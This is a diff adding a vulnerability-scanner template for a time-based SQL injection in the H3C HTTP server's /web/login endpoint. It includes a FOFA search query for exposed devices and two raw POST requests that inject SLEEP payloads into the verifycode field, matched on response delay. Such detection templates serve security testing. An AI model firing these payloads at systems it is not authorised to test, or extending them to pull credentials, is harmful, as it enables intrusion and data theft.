@@ -1,0 +1,35 @@
+id: H3C-http-web_login-sql-time
+
+info:
+  name: "H3C HTTP服务器 接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: server="H3C httpd" && title=="请登录"
+    H3C HTTP服务器的/web/login接口存在SQL注入安全缺陷。攻击者可通过该漏洞执行恶意SQL语句，导致数据库敏感信息泄露，如管理员凭证及用户数据。在具备高权限的情况下，可能进一步实现服务器端恶意代码执行，从而完全控制目标系统。
+  reference:
+  - https://mp.weixin.qq.com/s/aUM5zlV1it5ND4xhFMGz4g
+  tags: H3C
+
+http:
+- raw:
+  - |
+    POST /web/login HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded
+
+    user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(4)))dfpe) AND 'dYCM'='&language=0
+  - |
+    POST /web/login HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: application/x-www-form-urlencoded
+
+    user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(8)))dfpe) AND 'dYCM'='&language=0
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
